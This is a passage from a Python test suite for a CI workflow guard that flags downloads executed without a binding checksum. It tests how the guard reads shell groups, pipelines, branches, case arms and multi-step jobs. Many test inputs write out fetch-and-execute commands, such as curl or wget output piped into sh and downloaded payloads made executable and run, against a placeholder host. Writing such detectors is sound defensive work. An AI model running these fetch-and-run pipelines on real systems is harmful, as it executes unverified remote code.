                             (every, "( echo a\n  %s && " + sub + "\n  echo more\n)\n"),
                             (every, "%s && if true; then if true; then echo $(case x in x) "
                                     "echo y;; esac) || exit 1; fi; fi\n"),
                             (("bash",), "( echo a\n)\n%s && if true; then ( " + sub
                              + "\n) | tee log\nfi\n")):
            for shell in shells:
                with self.subTest(shell=shell, body=body):
                    self.assertLost(body, shell)
        # The controls, reported before and after: the same list with no `(`
        # before it, and the same prefixes with no `$(case ...)`.
        for shell in every:
            with self.subTest(shell=shell):
                self.assertLost("%s && " + sub + "\n", shell)
            for body in ("( echo a\n)\n%s && echo ok\n",
                         "%s && if true; then if true; then echo y || exit 1; fi; fi\n",
                         "( echo a\n)\n%s && if true; then ( echo y\n) | tee log\nfi\n"):
                with self.subTest(shell=shell, body=body):
                    self.assertAhead(body, shell)
        for shell in (None, "bash"):
            with self.subTest(shell=shell):
                self.assertAhead("arr=(\n  a\n)\n%s && echo ok\n", shell)
        # The price (fail-closed): a subshell that does hold the list reads the
        # same, though bash and dash stop the step on its failure.
        for shell in every:
            with self.subTest(shell=shell):
                self.assertLost("( %s && " + sub + " )\n", shell)

    def test_the_refusal_keeps_its_reach_inside_a_script_handed_on(self):
        # Review N-7: a lost list's check still stops the rest of its own
        # command. Inside `sh -ec '...'` that is the rest of the script, which
        # bash 5.2.21 and dash never reach; a use after the command is refused.
        for shell in (None, "sh", "bash"):
            for body in ("sh -ec '%s; chmod +x /tmp/payload; /tmp/payload' && ( echo a\n)\n",
                         "{ sh -ec '%s; chmod +x /tmp/payload; /tmp/payload'; } && ( echo a\n)\n"):
                with self.subTest(shell=shell, body=body):
                    self.assertEqual([], self.both(body + "echo done\n", shell, use=""))
            with self.subTest(shell=shell):
                self.assertLost("sh -ec '%s' && ( echo a\n)\n", shell)


class TestACheckThatEndsAGroupIsJudgedByWhatFollowsIt(unittest.TestCase):
    """#2334 and #2338 review I-2: a check that is the last command of a
    `{ }` group -- or of a `( )` whose `(` line the reader dropped -- is the
    group's status, so what bash applies to it is what follows the group:
    ahead of `&&` or `||` it suspends `-e` for the whole group, a piped group
    loses its status where pipefail is off, and `&` detaches it. The reader
    gives `{ CHECK; } && echo verified` as `{ CHECK` `;` `}` `&&` `echo
    verified`, so the guard judged the check by its own `;` and credited it
    for the whole step, where bash 5.2.21 and dash run the use after it. A
    check followed by the statements that close its groups is now judged by
    the separator after the last of them, and a group piped under pipefail
    passes its status on the way a subshell does (review N-1)."""

    FETCH = TestASetPlusEAtTheStepsTopLevel.FETCH
    CHECK = TestASetPlusEAtTheStepsTopLevel.CHECK
    USE = TestASetPlusEAtTheStepsTopLevel.USE
    job = TestASetPlusEAtTheStepsTopLevel.job
    both = TestACheckAheadOfAndGatesOnlyItsList.both

    def reported(self, body, shell, why):
        found = self.both(body, shell)
        self.assertEqual(1, len(found), found)
        self.assertIn("the checksum that names /tmp/payload " + why, found[0])

    def test_a_group_ahead_of_and_or_or_gates_only_what_it_reaches(self):
        for shell in (None, "sh", "bash"):
            for body in ("{ %s; } && echo verified\n", "{\n  %s\n} && echo verified\n",
                         "{ echo a; %s; } && echo b\n", "{ { %s; }; } && echo verified\n",
                         "( { %s; } ) && echo verified\n"):
                with self.subTest(shell=shell, body=body):
                    self.reported(body, shell, "runs ahead of `&&`")
            for body in ("{ %s; } || true\n", "{\n  %s\n} || echo failed\n"):
                with self.subTest(shell=shell, body=body):
                    self.reported(body, shell, "ends a group that hands its failure to a `||` "
                                               "branch that does not fail the step")
            with self.subTest(shell=shell, body="&"):
                self.reported("{ %s; } &\nwait\n", shell, "ends a group that is detached with `&`")

    def test_a_piped_group_gates_only_under_pipefail(self):
        piped = ("ends a group that is piped into another command where this guard reads "
                 "`pipefail` as off")
        for shell, body in ((None, "{ %s; } | tee log\n"), ("sh", "{ %s; } | tee log\n"),
                            ("bash {0}", "{ %s; } | tee log\n"),
                            ("bash", "set +o pipefail\n{ %s; } | tee log\n"),
                            (None, "{\n  %s\n} 2>&1 | tee log\n"), ("sh", "{\n  %s\n} 2>&1 | tee log\n"),
                            (None, "(\n  %s\n) 2>&1 | tee log\n"), ("sh", "(\n  %s\n) 2>&1 | tee log\n")):
            with self.subTest(shell=shell, body=body):
                self.reported(body, shell, piped)
        for shell, body in (("bash", "{ %s; } | tee log\n"), ("bash", "{\n  %s\n} 2>&1 | tee log\n"),
                            ("bash", "(\n  %s\n) 2>&1 | tee log\n"),
                            (None, "set -o pipefail\n{ %s; } | tee log\n"),
                            # N-1: a piped group ending the check's list runs in a
                            # subshell, whose status pipefail hands the pipeline.
                            ("bash", "{ %s && echo ok; } | cat\n")):
            with self.subTest(shell=shell, body=body):
                self.assertEqual([], self.job(body, shell))
        self.reported("{ %s && echo ok; } | cat\n", None, "runs ahead of `&&`")

    def test_the_forms_that_already_read_right_keep_their_verdicts(self):
        # Reported: the subshell twins, where the reader keeps the group on
        # the check's own statement, and the checks with no group at all.
        for shell in (None, "sh"):
            for body, why in (("( echo a; %s ) && echo b\n", "runs ahead of `&&`"),
                              ("( %s ) 2>&1 | tee log\n", "is piped into another command"),
                              ("%s && echo verified\n", "runs ahead of `&&`"),
                              ("%s | tee log\n", "is piped into another command")):
                with self.subTest(shell=shell, body=body):
                    self.reported(body, shell, why)
        # Cleared: a group whose failure still stops the step, and a use
        # inside the list the group heads.
        for shell in (None, "sh", "bash"):
            for body in ("{ %s; } || exit 1\n", "{ %s; }\n", "{\n  %s\n}\n",
                         '{ %s; } || { echo "::error::bad"; exit 1; }\n', "{ { %s; }; }\n",
                         "true && { %s; }\n", "{ %s && echo ok; } || exit 1\n",
                         "{ %s && echo ok; } && "):
                with self.subTest(shell=shell, body=body):
                    self.assertEqual([], self.job(body, shell))

    def test_with_errexit_off_a_group_stops_the_step_only_as_its_last_command(self):
        self.assertIn("runs after a `set +e`", self.job("set +e\n{ %s; }\n")[0][1])
        # The group, not the check, is the step's last command: its status is
        # the step's, and the job stops before the next step's use.
        self.assertEqual([], wg.job_defects([
            wg.Step("check", self.FETCH + "set +e\n{ " + self.CHECK + "; }\n"),
            wg.Step("run", self.USE)]))


class TestChecksumRescueStatus(unittest.TestCase):
    FETCH = "curl -fsSL https://example.test/payload -o payload\n"
    USE = "sh payload\n"

    def checked(self, rescue):
        return wg.fetch_exec_defect(
            self.FETCH + 'echo "%s  payload" | sha256sum -c - || %s\n'
            % (HEX, rescue) + self.USE)

    def test_success_and_unknown_exit_statuses_do_not_certify_failure(self):
        for rescue in ("exit 0", "return 0", "exit 256", "return 256",
                       "exit $STATUS", "return $STATUS", "exit nope",
                       "return nope"):
            with self.subTest(rescue=rescue):
                self.assertIsNotNone(self.checked(rescue))

    def test_group_uses_its_last_status(self):
        for rescue in ("{ false; echo recovered; }",
                       "{ false; true; }", "{ false; exit 0; }",
                       "{ false; return 256; }", "{ true; exit; }",
                       "{ echo recovered; exit $?; }", "(false; true)",
                       "((false; true))", "(false; (false; true))",
                       "false || true", "(false) || true",
                       "{ false; } || true", "(exit 1) || true",
                       "((exit 1); echo recovered)",
                       "{ if true; then false; else true; fi; }"):
            with self.subTest(rescue=rescue):
                self.assertIsNotNone(self.checked(rescue))

    def test_and_or_tail_can_rescue_failed_handlers(self):
        for rescue in ("false", "(false)", "{ false; }", "(exit 1)"):
            with self.subTest(rescue=rescue):
                self.assertIsNotNone(self.checked(rescue + " && true || true"))
        self.assertIsNone(self.checked("exit 1 && true || true"))
        self.assertIsNone(self.checked("{ exit 1; } && true || true"))

    def test_known_nonzero_rescues_remain_gates(self):
        for rescue in ("exit 1", "return 2", "exit 257", "false", "exit",
                       "return", "exit $?", "return $?",
                       "{ echo mismatch; exit 1; }", "{ echo mismatch; false; }",
                       "{ false; exit; }", "(echo mismatch; false)",
                       "((echo mismatch; false))", "(false; (true; false))",
                       "(exit 1; echo unreachable)", "exit 1 || true",
                       "{ exit 1; } || true"):
            with self.subTest(rescue=rescue):
                self.assertIsNone(self.checked(rescue))

    def test_negated_detached_and_pipeline_rescues_are_not_gates(self):
        for rescue in ("! false", "exit 1 | true || true", "{ false; } &",
                       "exit 1 &", "{ exit 1; } &"):
            with self.subTest(rescue=rescue):
                self.assertIsNotNone(self.checked(rescue))


class TestPipelineStreamProvenance(unittest.TestCase):
    URL = "https://example.test/install"

    def test_stdout_aliases_follow_ordered_pipeline_provenance(self):
        for script in ("curl -fsSL %s >/dev/stdout | sh" % self.URL,
                       "curl -fsSL %s >/dev/fd/1 | sh" % self.URL,
                       "curl -fsSL %s 3>&1 >/dev/null >&3 | sh" % self.URL,
                       "curl -fsSL %s | cat >/dev/stdout | sh" % self.URL,
                       "curl -fsSL %s | cat 3>&1 >/dev/null >&3 | sh" % self.URL,
                       "curl -fsSL %s | tee install.sh >/dev/fd/1 | sh" % self.URL):
            with self.subTest(script=script):
                self.assertTrue(wg.fetch_exec_defects(script))
        for script in ("curl -fsSL %s >/dev/stdout >saved | sh" % self.URL,
                       "curl -fsSL %s >/dev/null >/dev/stdout | sh" % self.URL,
                       "curl -fsSL %s | cat >saved >/dev/fd/1 | sh" % self.URL,
                       "curl -fsSL %s -o saved >/dev/stdout | sh" % self.URL):
            with self.subTest(script=script):
                self.assertFalse(wg.fetch_exec_defects(script))
        self.assertEqual("saved", wg.fetches(
            "curl -fsSL %s >saved >/dev/stdout | sh" % self.URL)[0].dest)

    def test_stdin_aliases_and_saved_descriptors(self):
        for suffix in ("cat /dev/stdin | sh", "cat /dev/fd/0 | sh",
                       "sed s/x/x/ /dev/stdin | sh", "cat </dev/stdin | sh",
                       "cat </dev/fd/0 | sh", "sh </dev/stdin", "sh </dev/fd/0",
                       "sh 3<&0 <local </dev/fd/3",
                       "cat 3<&0 <local </dev/fd/3 | sh",
                       "cat 3<&0 <local /dev/fd/3 | sh",
                       "sed s/x/x/ 3<&0 <local /dev/fd/3 | sh",
                       "sed s/x/x/ local /dev/stdin | sh",
                       "cat /dev/./stdin | sh", "cat /dev/fd/$FD | sh",
                       "cat /proc/self/fd/0 | sh", "sh </dev/fd/$FD",
                       "cat <local $INPUT | sh"):
            with self.subTest(suffix=suffix):
                self.assertTrue(wg.fetch_exec_defects(
                    "curl -fsSL %s | %s" % (self.URL, suffix)))
        for suffix in ("sh <local </dev/stdin", "sh </dev/stdin <local",
                       "cat <local /dev/stdin | sh",
                       "cat 3<local /dev/fd/3 | sh",
                       "sed s/x/x/ <local /dev/fd/0 | sh"):
            with self.subTest(suffix=suffix):
                self.assertFalse(wg.fetch_exec_defects(
                    "curl -fsSL %s | %s" % (self.URL, suffix)))

    def test_custom_filter_forwarding_and_disconnection(self):
        prefix = "curl -fsSL %s | ./custom-filter --mode decode" % self.URL
        self.assertTrue(wg.fetch_exec_defects(prefix + " | sh"))
        for suffix in ("", " <local | sh", " >saved | sh"):
            with self.subTest(suffix=suffix):
                self.assertFalse(wg.fetch_exec_defects(prefix + suffix))

    def test_forwarding_stages_reach_executors(self):
        for stages in ("cat | sh", "cat saved - | sh", "tee install.sh | sh",
                       "tr a-z A-Z | bash", "sed s/a/b/ | python3 -",
                       "cat | tee install.sh | bash", "head -c 1024 | sh",
                       "base64 -d | sh"):
            with self.subTest(stages=stages):
                self.assertTrue(wg.fetch_exec_defects(
                    "curl -fsSL %s | %s" % (self.URL, stages)))

    def test_read_only_and_disconnected_streams(self):
        for script in ("curl -fsSL %s | cat" % self.URL,
                       "curl -fsSL %s | head -c 1024" % self.URL,
                       "curl -fsSL %s | cat > saved | sh" % self.URL,
                       "curl -fsSL %s | head -c 10 < local | sh" % self.URL,
                       "curl -fsSL %s | head -c 10 > saved | sh" % self.URL,
                       "curl -fsSL %s | cat saved | sh" % self.URL,
                       "curl -fsSL %s | sed s/a/b/ saved | sh" % self.URL,
                       "curl -fsSL %s | cat | sh < local" % self.URL,
                       "curl -fsSL %s -o saved | cat | sh" % self.URL,
                       "curl -fsSL %s -o /dev/null | cat | sh" % self.URL,
                       "curl -fsSL %s > saved | cat | sh" % self.URL):
            with self.subTest(script=script):
                self.assertFalse(wg.fetch_exec_defects(script))

    def test_tee_still_names_the_file_it_writes(self):
        script = "curl -fsSL %s | tee install.sh | sh" % self.URL
        self.assertEqual("install.sh", wg.fetches(script)[0].dest)
        self.assertTrue(wg.fetch_exec_defects(script))

    def test_wget_stdout_and_tee_without_executor(self):
        self.assertTrue(wg.fetch_exec_defects(
            "wget -qO- %s | cat | sh" % self.URL))
        self.assertFalse(wg.fetch_exec_defects(
            "curl -fsSL %s | tee install.sh" % self.URL))

    def test_pipeline_inside_a_substitution_is_still_executed(self):
        self.assertTrue(wg.fetch_exec_defects(
            'echo "$(curl -fsSL %s | cat | sh)"' % self.URL))

    def test_only_final_descriptor_zero_provenance_disconnects_the_pipe(self):
        for suffix in ("cat 3<local | sh", "cat | sh 3<local",
                       "sh 3<local", "sh 3<<EOF\necho safe\nEOF",
                       "cat 3<&0 0<local 0<&3 | sh",
                       "cat 3<&0 <<EOF 0<&3 | sh\necho safe\nEOF",
                       "cat | sh 3<&0 <<EOF 0<&3\necho safe\nEOF",
                       "cat | sh 3<<EOF\necho safe\nEOF"):
            with self.subTest(suffix=suffix):
                self.assertTrue(wg.fetch_exec_defects(
                    "curl -fsSL %s | %s" % (self.URL, suffix)))
        # The delimiter is QUOTED wherever the body is what `sh` runs: an
        # EXPANDING script on an interpreter's stdin is reported unread in its
        # own right (#1839, and `TestTheGapsTheGuardDocuments`), which is a
        # different claim from the one under test here -- that the download
        # these steps pipe is not what the interpreter reads.
        for suffix in ("cat | sh <<'EOF'\necho safe\nEOF",
                       "sh <<'EOF'\necho safe\nEOF", "sh <local",
                       "cat 3<&0 0<local | sh",
                       "cat 0<&3 3<&0 | sh",
                       "cat 3<&0 0<&3 <<EOF | sh\necho safe\nEOF",
                       "cat | sh 3<&0 0<&3 <<'EOF'\necho safe\nEOF"):
            with self.subTest(suffix=suffix):
                self.assertFalse(wg.fetch_exec_defects(
                    "curl -fsSL %s | %s" % (self.URL, suffix)))


class TestTheMessageSaysWhatWasChecked(unittest.TestCase):
    """#1697: one sentence was doing four jobs.

    "the step's checksum does not name X" was printed whenever no checksum
    CLEARED the fetch -- including when one named it exactly and was refused
    for a different reason (swallowed, soft, under another `if:`). The author
    reading it goes looking for a naming bug in a line that names the file
    correctly, and the control's real objection never reaches them. And the
    scope has been the JOB since M5, so "the step's" was wrong twice over.
    """

    FETCH = "curl -sfL https://example.test/payload -o /tmp/payload\n"
    CHECK = 'echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX
    EXEC = "chmod +x /tmp/payload\n"

    def why(self, *steps):
        found = wg.job_defects(list(steps))
        self.assertEqual(1, len(found), found)
        return found[0][1]

    def test_no_checksum_in_the_job_names_it(self):
        why = self.why(("get", self.FETCH),
                       ("check", 'echo "%s  /tmp/other" | sha256sum -c -\n'
                                 % OTHER_HEX),
                       ("run", self.EXEC))
        self.assertIn("no checksum in the job names", why)

    def test_a_checksum_that_names_it_and_was_swallowed(self):
        why = self.why(("get", self.FETCH),
                       ("check", self.CHECK.rstrip("\n") + " || true\n"),
                       ("run", self.EXEC))
        self.assertIn("the checksum that names", why)
        self.assertIn("`||` branch", why)
        self.assertNotIn("does not name", why)

    def test_a_checksum_that_names_it_and_carries_no_digest(self):
        # `$FILE` is an expansion, not an expectation: the checked text names
        # the download and says nothing about what should have arrived.
        why = self.why(("get", self.FETCH),
                       ("check", 'echo "$FILE  /tmp/payload" | sha256sum -c -\n'),
                       ("run", self.EXEC))
        self.assertIn("the checksum that names", why)
        self.assertIn("no digest", why)

    def test_a_checksum_that_names_it_under_another_condition(self):
        why = self.why(wg.Step("get", self.FETCH),
                       wg.Step("check", self.CHECK, None, "github.ref == 'main'"),
                       wg.Step("run", self.EXEC))
        self.assertIn("the checksum that names", why)
        self.assertIn("`if:`", why)

    def test_a_checksum_that_names_it_in_a_soft_step(self):
        why = self.why(wg.Step("get", self.FETCH),
                       wg.Step("check", self.CHECK, None, None, True),
                       wg.Step("run", self.EXEC))
        self.assertIn("continue-on-error", why)

    def test_the_scope_is_never_called_the_step(self):
        for why in (self.why(("get", self.FETCH), ("run", self.EXEC)),
                    self.why(("get", self.FETCH),
                             ("check", 'echo "%s  /tmp/other" | sha256sum -c -\n'
                                       % OTHER_HEX),
                             ("run", self.EXEC))):
            self.assertNotIn("the step's checksum", why)


class TestABranchIsNotAlwaysTaken(unittest.TestCase):
    """#1697 item 3: a `sha256sum -c` inside a `then` branch may not run.

    The reader is flat -- it produces statements, not a tree -- but the words
    that open and close a body (`then`, `else`, `do`, `fi`, `done`) are right
    there in the argv it produced, so "written inside a branch" is a question
    it can answer. This is the shell twin of the `if:` on a step (`_binds`),
    and it is refused for the same reason: a check that may be skipped cannot
    clear an execution that is not.
    """

    FETCH = "curl -sfL https://example.test/payload -o /tmp/payload\n"
    CHECK = 'echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX
    EXEC = "chmod +x /tmp/payload\n"

    def test_a_check_inside_a_then_branch_clears_nothing_outside_it(self):
        self.assertIsNotNone(wg.fetch_exec_defect(
            self.FETCH + "if true; then\n" + self.CHECK + "fi\n" + self.EXEC))

    def test_a_check_inside_a_loop_body_clears_nothing_outside_it(self):
        self.assertIsNotNone(wg.fetch_exec_defect(
            self.FETCH + "for f in x; do\n" + self.CHECK + "done\n" + self.EXEC))

    def test_the_same_branch_as_the_use_still_binds(self):
        # The hardened spelling: fetch, check and use share one body, so they
        # run together or not at all -- refusing this would push authors off
        # the rule instead of onto it.
        self.assertIsNone(wg.fetch_exec_defect(
            "if true; then\n" + self.FETCH + self.CHECK + self.EXEC + "fi\n"))

    def test_a_then_branch_does_not_clear_an_else_branch(self):
        # The check runs FIRST in statement order, so ordering is not what
        # refuses it: the two bodies are alternatives.
        self.assertIsNotNone(wg.fetch_exec_defect(
            self.FETCH + "if true; then\n" + self.CHECK + "else\n" +
            self.EXEC + "fi\n"))

    def test_a_check_after_the_fi_still_binds(self):
        self.assertIsNone(wg.fetch_exec_defect(
            self.FETCH + "if true; then :; fi\n" + self.CHECK + self.EXEC))

    def test_a_nested_branch_does_not_clear_its_parent(self):
        self.assertIsNotNone(wg.fetch_exec_defect(
            self.FETCH + "if true; then\n" + "if true; then\n" + self.CHECK +
            "fi\n" + self.EXEC + "fi\n"))

    # `case` arms are branch bodies too, and after the `if`/`else` twin was
    # refused this was the one spelling left that still bought the credit.
    CASE_SPLIT = ("case $x in\n"
                  " a)\n"
                  "   curl -sfL https://example.test/payload -o /tmp/payload\n"
                  '   echo "%s  /tmp/payload" | sha256sum -c -\n'
                  "   ;;\n"
                  " b)\n"
                  "   chmod +x /tmp/payload\n"
                  "   ;;\n"
                  "esac\n") % HEX

    def test_one_arm_of_a_case_does_not_clear_another(self):
        self.assertIsNotNone(wg.fetch_exec_defect(self.CASE_SPLIT))

    def test_an_arm_written_on_one_line_is_read_at_all(self):
        # `a) curl …` puts the pattern where the command was expected, which
        # hid the fetch itself -- the same class as `then` and `f() {`.
        script = ("case $x in\n"
                  " a) curl -sfL https://example.test/payload -o /tmp/payload\n"
                  '    echo "%s  /tmp/payload" | sha256sum -c - ;;\n'
                  " b) chmod +x /tmp/payload ;;\n"
                  "esac\n") % HEX
        self.assertEqual(1, len(wg.fetches(script)), wg.fetches(script))
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_one_arm_holding_all_three_still_binds(self):
        script = ("case $x in\n"
                  " a)\n"
                  "   curl -sfL https://example.test/payload -o /tmp/payload\n"
                  '   echo "%s  /tmp/payload" | sha256sum -c -\n'
                  "   chmod +x /tmp/payload\n"
                  "   ;;\n"
                  "esac\n") % HEX
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_an_alternation_pattern_still_opens_a_new_arm(self):
        script = ("case $x in\n"
                  " a|b)\n"
                  "   curl -sfL https://example.test/payload -o /tmp/payload\n"
                  '   echo "%s  /tmp/payload" | sha256sum -c -\n'
                  "   ;;\n"
                  " c)\n"
                  "   chmod +x /tmp/payload\n"
                  "   ;;\n"
                  "esac\n") % HEX
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_quoted_multi_word_arm_patterns_still_open_their_own_arms(self):
        # Round-2 re-review: the arm regex forbade whitespace, so a pattern
        # written `"a b")` -- one word carrying a space once the quotes are
        # read -- did not open an arm. With ONE such arm the `case` keyword's
        # own body still separated it from the next recognised arm; with two,
        # both bodies shared that region and a check in one cleared a use in
        # the other.
        script = ("case $x in\n"
                  ' "a b")\n'
                  "   curl -sfL https://example.test/payload -o /tmp/payload\n"
                  '   echo "%s  /tmp/payload" | sha256sum -c -\n'
                  "   ;;\n"
                  ' "c d")\n'
                  "   chmod +x /tmp/payload\n"
                  "   ;;\n"
                  "esac\n") % HEX
        stmts = shell_reader.statements(script)
        bodies = workflow_forms.regions(stmts)
        fetch = next(i for i, st in enumerate(stmts)
                     if st.stages[0].argv and st.stages[0].argv[0] == "curl")
        run = next(i for i, st in enumerate(stmts)
                   if st.stages[0].argv and st.stages[0].argv[0] == "chmod")
        self.assertNotEqual(bodies.get(fetch), bodies.get(run), bodies)
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_check_after_the_esac_still_binds(self):
        self.assertIsNone(wg.fetch_exec_defect(
            self.FETCH + "case $x in\n a)\n   :\n   ;;\nesac\n" +
            self.CHECK + self.EXEC))

    # Every terminator that ENDS an arm, not just `;;`. Reading only `;;`
    # left the parser expecting a body, so the next arm's `b)` closed a
    # subshell that was never opened and `b` became the command -- which
    # SHADOWED the `curl` behind it, and a guard that sees no download
    # reports a clean step (fix round on #1714, Critical 2).
    TERMINATORS = (";;", ";&", ";;&")

    def test_a_terminator_does_not_hide_the_next_arms_command(self):
        for terminator in self.TERMINATORS:
            script = ("case $x in a) echo hi %s b) %s esac\n"
                      % (terminator, self.FETCH.replace("\n", " ;; ")))
            with self.subTest(terminator=terminator):
                fetches = wg.fetches(script)
                self.assertEqual(1, len(fetches), fetches)
                self.assertEqual("/tmp/payload", fetches[0].dest)

    def test_a_terminator_still_opens_a_NEW_arm(self):
        # The other half: the reset has to put a BOUNDARY there too, or a
        # check in one arm clears a use in the next. `;&` falls through at
        # run time, but only when the FIRST pattern matched -- arriving at
        # `b)` directly runs no check at all, so the arms stay separate.
        for terminator in self.TERMINATORS:
            script = ("case $x in\n a)\n   " + self.FETCH + "   " +
                      self.CHECK + "   " + terminator + "\n b)\n   " +
                      self.EXEC + "   ;;\nesac\n")
            with self.subTest(terminator=terminator):
                self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_the_message_says_it_was_the_branch(self):
        why = wg.fetch_exec_defect(
            self.FETCH + "if true; then\n" + self.CHECK + "fi\n" + self.EXEC)
        self.assertIn("the checksum that names", why)
        self.assertIn("branch", why)

    def test_a_branch_in_one_step_does_not_reach_into_the_next(self):
        # Each step is its own shell invocation, so an unterminated `if` in
        # step A must not make step B's checksum look conditional.
        self.assertEqual([], wg.job_defects(
            [("a", "if true; then :; fi\n"),
             ("b", self.FETCH + self.CHECK + self.EXEC)]))


class TestAScriptsKeywordsAreItsOwn(unittest.TestCase):
    """Review I-3 of the #1793 follow-ups: `regions` read the keywords of a
    script handed to a shell as the step's own, so the `fi` in
    `sh <<< 'fi' || true` closed the loop around it, and the checksum after
    it read as unconditional. With X unset, bash 3.2 and 5.2 skip the loop and
    run `./tool` with the checksum failing. A script's statements now sit in
    the branch of the command that runs it, and its keywords shape only its
    own map."""

    FETCH = "curl -fsSL -o tool https://example.test/tool\n"
    CHECK = 'echo "%s  tool" | sha256sum -c -\n' % HEX

    def job(self, opened, form, closed):
        return wg.job_defects([("step", self.FETCH + opened + form + "\n" + self.CHECK +
                                closed + "./tool\n")])

    def test_a_close_inside_a_script_does_not_close_the_steps_branch(self):
        for opened, closed in (("for f in $X; do\n", "done\n"),
                               ('if [ -n "$X" ]; then\n', "fi\n")):
            for form in ("sh <<< 'fi' || true", "sh -c 'fi' || true",
                         "sh <<'EOF' || true\nfi\nEOF", "eval 'fi' || true",
                         "sh -c 'done; esac' || true"):
                with self.subTest(opened=opened, form=form):
                    found = self.job(opened, form, closed)
                    self.assertEqual(1, len(found), found)
                    self.assertIn(wg._UNSHARED_BRANCH, found[0][1])

    def test_an_open_inside_a_script_does_not_hold_the_steps_branch_open(self):
        # The loop's `done` closed the script's `then` instead of the loop, and
        # `./tool` read as inside the loop with the checksum.
        found = wg.job_defects([("step", self.FETCH + "for f in $X; do\n" + self.CHECK +
                                 "sh -c 'if true; then' || true\ndone\n./tool\n")])
        self.assertEqual(1, len(found), found)
        self.assertIn(wg._UNSHARED_BRANCH, found[0][1])

    def test_a_script_on_the_line_opening_a_branch_runs_in_it(self):
        # It was read ahead of the `then`/`do` that carries it, as if it always
        # ran: base cleared `./tool` after `fi` with it, and bash skips it.
        for form in ("if [ -n \"$X\" ]; then sh -c '%s'; fi\n",
                     "for f in $X; do sh -c '%s'; done\n",
                     "if [ -n \"$X\" ]; then sh <<< '%s'; fi\n"):
            with self.subTest(form=form):
                found = wg.job_defects([("step", self.FETCH + form % self.CHECK.strip() +
                                         "./tool\n")])
                self.assertEqual(1, len(found), found)
                self.assertIn(wg._UNSHARED_BRANCH, found[0][1])
        # ... and, the other way, in the arm its pattern opens, with the use.
        self.assertEqual([], wg.job_defects([("step", self.FETCH + "case \"$X\" in\n"
                                              "  a) sh -c '%s'; ./tool ;;\nesac\n"
                                              % self.CHECK.strip())]))

    def test_the_scripts_own_branches_still_bind(self):
        # A checksum inside the script's own `if` clears nothing outside it;
        # one after the script's balanced branch clears the use after it.
        self.assertIn(wg._UNSHARED_BRANCH, wg.job_defects([("step", self.FETCH +
            "sh -ec 'if [ -n \"$X\" ]; then %s; fi'\n./tool\n" % self.CHECK.strip())])[0][1])
        self.assertEqual([], wg.job_defects([("step", self.FETCH +
            "sh -ec 'if true; then :; fi; %s'\n./tool\n" % self.CHECK.strip())]))
        self.assertEqual([], wg.job_defects([("step", self.FETCH + 'if [ -n "$X" ]; then\n' +
            "sh -ec '%s'\n./tool\nfi\n" % self.CHECK.strip())]))

    def test_without_the_script_the_branch_is_reported_as_before(self):
        # The must-trip control: reported on every tree.
        found = self.job("for f in $X; do\n", ":", "done\n")
        self.assertEqual(1, len(found), found)


class TestTheJobIsTheScope(unittest.TestCase):
    """M5: steps in one job share the workspace, /tmp and PATH.

    A rule scoped to a single `run:` block is evaded by splitting the act in
    two -- step A downloads, step B runs it -- and neither step is a
    fetch-and-exec on its own. The same sharing is what makes a checksum in a
    later step a legitimate verification of an earlier fetch, so the fold has
    to run both ways.
    """

    FETCH = ("fetch", "curl -sfL https://example.test/payload -o /tmp/payload\n")
    CHECK = ("check", 'echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX)
    RUN = ("run", "chmod +x /tmp/payload\n/tmp/payload --version\n")

    def test_a_fetch_in_one_step_and_the_execution_in_another(self):
        found = wg.job_defects([self.FETCH, self.RUN])
        self.assertEqual(1, len(found), found)
        step, why = found[0]
        self.assertEqual("fetch", step)         # attributed to the fetching step
        self.assertIn("/tmp/payload", why)

    def test_a_checksum_in_a_later_step_binds_an_earlier_fetch(self):
        self.assertEqual([], wg.job_defects([self.FETCH, self.CHECK, self.RUN]))

    def test_order_is_the_job_order(self):
        # The same three steps, check last: verified only AFTER the run.
        found = wg.job_defects([self.FETCH, self.RUN, self.CHECK])
        self.assertEqual(1, len(found), found)
        self.assertIn("only AFTER", found[0][1])

    def test_a_conditional_steps_check_does_not_count(self):
        # M4: folding an `if:` step as if it always runs is conservative on the
        # fetch axis and FAIL-OPEN on the check axis -- a checksum that may be
        # skipped cannot clear a download that always happens.
        steps = [wg.Step(*self.FETCH),
                 wg.Step(self.CHECK[0], self.CHECK[1], None,
                         "github.event_name == 'push'"),
                 wg.Step(*self.RUN)]
        found = wg.job_defects(steps)
        self.assertEqual(1, len(found), found)
        self.assertEqual("fetch", found[0][0])

    def test_a_check_under_the_SAME_condition_as_the_use_still_binds(self):
        # The shape the fleet actually has (nvd-cache.yml's sync step): the
        # fetch, the checksum and the `unzip` share one `if:`, so they run
        # together or not at all. A blanket "no conditional check counts" rule
        # fails THIS, which is how the fleet caught it.
        when = "steps.decide.outputs.sync == 'true'"
        steps = [wg.Step(self.FETCH[0], self.FETCH[1], None, when),
                 wg.Step(self.CHECK[0], self.CHECK[1], None, when),
                 wg.Step(self.RUN[0], self.RUN[1], None, when)]
        self.assertEqual([], wg.job_defects(steps))

    def test_one_conditional_step_holding_all_three_binds(self):
        script = self.FETCH[1] + self.CHECK[1] + self.RUN[1]
        self.assertEqual([], wg.job_defects(
            [wg.Step("sync", script, None, "steps.decide.outputs.sync == 'true'")]))

    def test_a_conditional_step_still_counts_as_fetching(self):
        steps = [wg.Step(self.FETCH[0], self.FETCH[1], None, "always()"),
                 wg.Step(*self.RUN)]
        self.assertEqual(1, len(wg.job_defects(steps)))

    def test_a_job_level_condition_reaches_every_step(self):
        doc = {"jobs": {"b": {"if": "github.ref == 'main'",
                              "steps": [{"run": "make test"}]}}}
        self.assertEqual("github.ref == 'main'", wg.run_jobs(doc)[0][1][0].condition)

    def test_a_job_with_no_fetch_is_clean(self):
        self.assertEqual([], wg.job_defects([("build", "make test\n")]))


class TestEveryUseIsAskedForItsCheck(unittest.TestCase):
    """Review I-1 of the #1793 follow-ups: `_defect` asked only a download's
    FIRST use whether a binding checksum came before it. A use inside the
    checksum's branch, `case` arm, loop body or `if:` step, ahead of a use
    after it, took the binding, and the job read clean while bash 3.2 and 5.2
    run the later use with the checksum skipped. Each use is asked now, in
    order, and the first one no checksum clears is the one reported: reading
    one more use can add a report, never remove one."""

    URL = "https://example.test/tool"
    CHECK = 'echo "%s  %%s" | sha256sum -c -\n' % HEX
